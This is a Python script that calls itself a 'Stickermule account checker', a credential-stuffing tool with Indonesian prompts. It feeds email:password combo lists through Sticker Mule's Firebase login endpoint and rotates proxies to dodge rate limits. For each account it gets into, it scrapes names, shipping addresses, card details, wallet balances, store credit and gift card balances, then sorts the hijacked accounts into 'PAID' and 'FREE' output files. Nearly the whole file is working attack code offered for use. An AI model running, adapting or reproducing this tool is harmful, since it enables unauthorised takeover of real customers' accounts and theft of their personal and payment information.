import requests
import time
import re
import random
import os
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from colorama import init, Fore
from itertools import cycle

init(autoreset=True)

# ==== Global Counter & Lock ====
counter_lock = Lock()
progress_count = 0
live_paid = 0
live_free = 0
live_exp = 0

LOG_DIR = "log"

def ensure_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def random_session(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

class ProxyManager:
    def __init__(self, proxy_list):
        self.proxies = proxy_list[:]
        random.shuffle(self.proxies)
        self.proxy_cycle = cycle(self.proxies) if self.proxies else None
        self.lock = Lock()

    def get_next_proxy(self):
        if not self.proxy_cycle:
            return None
        with self.lock:
            return next(self.proxy_cycle)

    def format_proxy(self, proxy):
        if "<SESSION>" in proxy or "-session-<SESSION>" in proxy:
            session_id = random_session()
            proxy = proxy.replace("<SESSION>", session_id)
        if proxy.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
            return {"http": proxy, "https": proxy}
        parts = proxy.split(":")
        if len(parts) == 2:
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        elif len(parts) == 4:
            ip, port, user, pwd = parts
            return {
                "http": f"http://{user}:{pwd}@{ip}:{port}",
                "https": f"http://{user}:{pwd}@{ip}:{port}"
            }
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def parse_address(html):
    match = re.search(r'Shipping addresses</p><p class="jsx-[^"]+ value regular">(.*?)<', html, re.DOTALL)
    if match:
        return match.group(1).strip()
    address_matches = re.findall(r'{"__typename":"Address","addressLine1":"(.*?)".*?"cityName":"(.*?)".*?"countryName":"(.*?)".*?"zipCode":"(.*?)"', html, re.DOTALL)
    if address_matches:
        addr = address_matches[0]
        return f"{addr[0]}, {addr[1]}, {addr[2]}, {addr[3]}"
    return "-"

def parse_cards_from_json(html):
    pattern = r'{"__typename":"PaymentMethodCreditCard".*?"issuer":"(.*?)".*?"month":(\d+),"year":(\d+).*?"lastDigits":"(\d+)"'
    cards = re.findall(pattern, html, re.DOTALL)
    if cards:
        results = [f"{issuer.capitalize()} Exp {str(month).zfill(2)}/{year} ****{last_digits}" for issuer, month, year, last_digits in cards]
        return " | ".join(results)
    return "-"

def extract_wallet(html):
    match = re.search(r'<p class="jsx-[^"]+ balance regular">(.*?)</p>', html)
    return match.group(1).strip() if match else "-"

def extract_store_credit(html):
    match = re.search(r'Store credit.*?<p class="jsx-[^"]+ balance regular">(.*?)</p>', html, re.DOTALL|re.IGNORECASE)
    return match.group(1).strip() if match else extract_wallet(html)

def extract_gift_card(html):
    match = re.search(r'Gift card.*?<p class="jsx-[^"]+ balance regular">(.*?)</p>', html, re.DOTALL|re.IGNORECASE)
    return match.group(1).strip() if match else extract_wallet(html)

def extract_centang(html):
    match = re.search(r'ID Verification</p><p class="jsx-[^"]+ value regular">(.*?)<', html)
    if match:
        status = match.group(1).strip()
        if status.lower() == "verified":
            return "Verified"
        elif status.lower() == "unverified":
            return "Unverified"
        else:
            return status
    return "-"

def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, "r") as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    proxies.append(proxy)
    except Exception as e:
        print(Fore.RED + f"Proxy file error: {e}")
    return proxies

def check_account(email, password, out_file, free_file, exp_file, proxy_mgr=None, delay_sec=5, max_proxy_retries=5):
    global progress_count, live_paid, live_free, live_exp
    ensure_log_dir()
    last_error = None
    used_proxy = None

    # Try login with proxy rotation if enabled
    for retry in range(max_proxy_retries if proxy_mgr else 1):
        session = requests.Session()
        id_token = None
        if proxy_mgr:
            used_proxy = proxy_mgr.get_next_proxy()
            proxy_dict = proxy_mgr.format_proxy(used_proxy)
            session.proxies.update(proxy_dict)
        login_url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyA4hyayiHs97g99Nz4O0FHH0RZJhY87TKU"
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        payload = {"returnSecureToken": True, "email": email, "password": password}

        try:
            resp = session.post(login_url, headers=headers, json=payload, timeout=15)
            data = resp.json()
            if resp.status_code == 400:
                error = data.get("error", {}).get("message", "")
                if error in ["EMAIL_NOT_FOUND", "INVALID_EMAIL"]:
                    with counter_lock:
                        progress_count += 1
                        info = f"PROXY {used_proxy} | " if used_proxy else ""
                        print(Fore.RED + f"{info}DIE | {email}:{password} | {error} | ({progress_count})")
                    return False
                elif error == "QUOTA_EXCEEDED":
                    # Proxy kena limit/abuse, coba proxy baru
                    with counter_lock:
                        print(Fore.YELLOW + f"Proxy busy/limit... [{used_proxy}] (retry {retry+1})")
                    time.sleep(1 + random.uniform(0, 1))
                    continue
                else:
                    with counter_lock:
                        progress_count += 1
                        info = f"PROXY {used_proxy} | " if used_proxy else ""
                        print(Fore.RED + f"{info}DIE | {email}:{password} | {error} | ({progress_count})")
                    return False
            elif resp.status_code == 200:
                id_token = data.get("idToken", "")
                break
            else:
                with counter_lock:
                    progress_count += 1
                    info = f"PROXY {used_proxy} | " if used_proxy else ""
                    print(Fore.RED + f"{info}DIE | {email}:{password} | RESP {resp.status_code} | ({progress_count})")
                return False
        except requests.RequestException as e:
            last_error = str(e)
            with counter_lock:
                print(Fore.YELLOW + f"Request/proxy err: {e} [{used_proxy}] (retry {retry+1})")
            time.sleep(1 + random.uniform(0, 1))
            continue
    else:
        # Semua proxy gagal
        with counter_lock:
            progress_count += 1
            info = f"PROXY {used_proxy} | " if used_proxy else ""
            print(Fore.RED + f"{info}DIE | {email}:{password} | PROXY_FAIL | ({progress_count})")
        return False

    # Ambil cookie session
    try:
        cookie_url = "https://www.stickermule.com/session-cookie"
        resp_cookie = session.post(cookie_url, headers=headers, json={"idToken": id_token}, timeout=15)
        auth_cookie = ""
        if "set-cookie" in resp_cookie.headers:
            match = re.search(r'auth-stickermule_com=([^;]+)', resp_cookie.headers["set-cookie"])
            if match:
                auth_cookie = match.group(1)
    except Exception:
        auth_cookie = ""

    # Ambil profile info
    profile_url = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyA4hyayiHs97g99Nz4O0FHH0RZJhY87TKU"
    try:
        resp2 = session.post(profile_url, headers=headers, json={"idToken": id_token}, timeout=15)
        users = resp2.json().get("users", [])
        display_name = users[0].get("displayName", "-") if users else "-"
    except Exception:
        display_name = "-"

    cookies = {"auth-stickermule_com": auth_cookie} if auth_cookie else {}
    debug_path = os.path.join(LOG_DIR, f"debug_{email.replace('@', '_')}.html")
    try:
        resp3 = session.get("https://www.stickermule.com/account", headers=headers, cookies=cookies, timeout=15)
        page = resp3.text
        with open(debug_path, "w", encoding="utf-8") as f:
            f.write(page)
    except Exception:
        page = ""

    # Parse data
    name = display_name
    address = parse_address(page)
    card = parse_cards_from_json(page)
    wallet = extract_wallet(page)
    store_credit = extract_store_credit(page)
    giftcard = extract_gift_card(page)
    centang = extract_centang(page)
    more_cc = "-"

    if os.path.exists(debug_path):
        try:
            os.remove(debug_path)
        except Exception:
            pass

    is_paid = ((address != "-" and card != "-") or (address != "-" and centang == "Verified"))
    is_free = (address != "-" and card == "-" and centang != "Verified")
    is_exp = not is_paid and not is_free and address != "-"

    date_str = time.strftime("%Y-%m-%d %H:%M:%S")

    with counter_lock:
        progress_count += 1
        info = f"PROXY {used_proxy} | " if used_proxy else ""
        if is_paid:
            global live_paid
            live_paid += 1
            print(Fore.GREEN + f"{info}LIVE | {email}:{password} | PAID | Name:{name} | Address:{address} | Card:{card} | Wallet:{wallet} | Store Credit:{store_credit} | Gift Card:{giftcard} | Centang:{centang} | ({progress_count})")
        elif is_free:
            global live_free
            live_free += 1
            print(Fore.CYAN + f"{info}LIVE (FREE) | {email}:{password} | FREE | Name:{name} | Address:{address} | Wallet:{wallet} | Store Credit:{store_credit} | Gift Card:{giftcard} | Centang:{centang} | ({progress_count})")
        elif is_exp:
            global live_exp
            live_exp += 1
            print(Fore.LIGHTYELLOW_EX + f"{info}{email}:{password} | EXP ACCOUNT | Name:{name} | Address:{address} | Card:{card} | Centang:{centang}")
        else:
            print(Fore.RED + f"{info}{email}:{password} | STATUS UNKNOWN | Name:{name} | Address:{address} | Card:{card} | Centang:{centang}")

    log = (
        f"[-]---- STICKMULE ----[-]\n"
        f"{email}:{password}\n"
        f"----------------------------\n"
        f"[-] Date = {date_str}\n"
        f"[-] Full Name = {name}\n"
        f"[-] Address = {address}\n"
        f"[-] Have Card = {card}\n"
        f"[-] More CC = {more_cc}\n"
        f"[-] Wallet = {wallet}\n"
        f"[-] Centang = {centang}\n"
        f"[+] Store Credit = {store_credit}\n"
        f"[+] Giftcard = {giftcard}\n"
        f"[-]---------- END ----------[-]\n\n"
    )
    target_file = out_file if is_paid else (free_file if is_free else exp_file)
    with open(target_file, "a", encoding="utf-8") as f:
        f.write(log)
    time.sleep(delay_sec)
    return True

def banner_input_step():
    box_top = "╔════════════════════════════════════════════════════════╗"
    box_bot = "╚════════════════════════════════════════════════════════╝"
    sep =   "╠════════════════════════════════════════════════════════╣"
    print(Fore.MAGENTA + box_top)
    print("║{:^54}║".format("STICKERMULE ACCOUNT CHECKER"))
    print(sep)
    print("║ Masukkan jumlah thread (misal 5):                    ║")
    print(box_bot)
    while True:
        try:
            max_threads = int(input("> "))
            if max_threads > 0:
                break
        except ValueError:
            print("Masukkan angka!")
    print(Fore.MAGENTA + box_top)
    print("║{:^54}║".format("STICKERMULE ACCOUNT CHECKER"))
    print(sep)
    print(f"║ Jumlah thread: {max_threads:<37}║")
    print("║ Masukkan nama file combo (misal combolist.txt):      ║")
    print(box_bot)
    combo_file = input("> ").strip() or "wordlist.txt"
    print(Fore.MAGENTA + box_top)
    print("║{:^54}║".format("STICKERMULE ACCOUNT CHECKER"))
    print(sep)
    print(f"║ Jumlah thread: {max_threads:<37}║")
    print(f"║ File combo: {combo_file:<41}║")
    print("║ Nama file output (default: STICKERMULE_RECHECK.txt): ║")
    print(box_bot)
    output_file = input("> ").strip() or "STICKERMULE_RECHECK.txt"
    print(Fore.MAGENTA + box_top)
    print("║{:^54}║".format("STICKERMULE ACCOUNT CHECKER"))
    print(sep)
    print(f"║ Jumlah thread: {max_threads:<37}║")
    print(f"║ File combo: {combo_file:<41}║")
    print(f"║ File output: {output_file:<39}║")
    print("║ Nama file output FREE akun (default: ...):           ║")
    print(box_bot)
    free_file = input("> ").strip() or "STICKERMULE_FREE.txt"
    print(Fore.MAGENTA + box_top)
    print("║{:^54}║".format("STICKERMULE ACCOUNT CHECKER"))
    print(sep)
    print(f"║ Jumlah thread: {max_threads:<37}║")
    print(f"║ File combo: {combo_file:<41}║")
    print(f"║ File output: {output_file:<39}║")
    print(f"║ File FREE: {free_file:<41}║")
    print("║ Gunakan proxy? (y/n):                                ║")
    print(box_bot)
    use_proxy = input("> ").strip().lower() == 'y'
    proxy_file = "proxy.txt"
    if use_proxy:
        print(Fore.MAGENTA + box_top)
        print("║{:^54}║".format("STICKERMULE ACCOUNT CHECKER"))
        print(sep)
        print(f"║ Jumlah thread: {max_threads:<37}║")
        print(f"║ File combo: {combo_file:<41}║")
        print(f"║ File output: {output_file:<39}║")
        print(f"║ File FREE: {free_file:<41}║")
        print("║ File proxy (default: proxy.txt):                     ║")
        print(box_bot)
        proxy_file = input("> ").strip() or "proxy.txt"
    print(Fore.MAGENTA + box_top)
    print("║{:^54}║".format("STICKERMULE ACCOUNT CHECKER"))
    print(sep)
    print(f"║ Jumlah thread: {max_threads:<37}║")
    print(f"║ File combo: {combo_file:<41}║")
    print(f"║ File output: {output_file:<39}║")
    print(f"║ File FREE: {free_file:<41}║")
    if use_proxy:
        print(f"║ File proxy: {proxy_file:<40}║")
    print("║ Masukkan delay antar akun dalam detik (default 5):   ║")
    print(box_bot)
    try:
        delay_sec = int(input("> ").strip() or "5")
    except:
        delay_sec = 5
    return max_threads, combo_file, output_file, free_file, use_proxy, proxy_file, delay_sec

def main():
    ascii_banner = r"""
                 __    ______                
    ____  ____ _/ /_  / / __ \___  __________
   / __ \/ __ `/ __ \/ / / / / _ \/ ___/ ___/
  / /_/ / /_/ / /_/ / / /_/ /  __(__  ) /__  
 / .___/\__,_/_.___/_/\____/\___/____/\___/  
/_/                                          
    """
    print(Fore.YELLOW + ascii_banner)
    (max_threads, combo_file, output_file, free_file, use_proxy, proxy_file, delay_sec) = banner_input_step()
    exp_file = "EXP_ACCOUNT.txt"

    proxy_list = []
    proxy_mgr = None
    if use_proxy:
        proxy_list = load_proxies(proxy_file)
        if not proxy_list:
            print(Fore.RED + "Proxy list kosong! Lanjut tanpa proxy.")
            use_proxy = False
        else:
            proxy_mgr = ProxyManager(proxy_list)

    combos = []
    try:
        with open(combo_file, "r", encoding="utf-8") as f:
            for idx, line in enumerate(f, 1):
                line = line.strip()
                if ":" not in line:
                    continue
                email, pwd = line.split(":", 1)
                if not email or not pwd:
                    print(Fore.YELLOW + f"[SKIP] Combo baris {idx} kosong/tidak valid: {line}")
                    continue
                combos.append((email, pwd))
    except Exception as e:
        print(f"File {combo_file} tidak ditemukan! ({e})")
        return

    print(f"Loaded {len(combos)} combos. Mulai check...\n")

    def check_account_wrapper(email, pwd):
        return check_account(
            email, pwd, output_file, free_file, exp_file,
            proxy_mgr, delay_sec
        )

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [
            executor.submit(check_account_wrapper, email, pwd)
            for email, pwd in combos
        ]
        for future in as_completed(futures):
            pass

    print("\n==== DONE ====")
    print(Fore.GREEN + f"Total LIVE (PAID): {live_paid}")
    print(Fore.CYAN + f"Total LIVE (FREE): {live_free}")
    print(Fore.LIGHTYELLOW_EX + f"Total EXP ACCOUNT: {live_exp}")

if __name__ == "__main__":
    main()
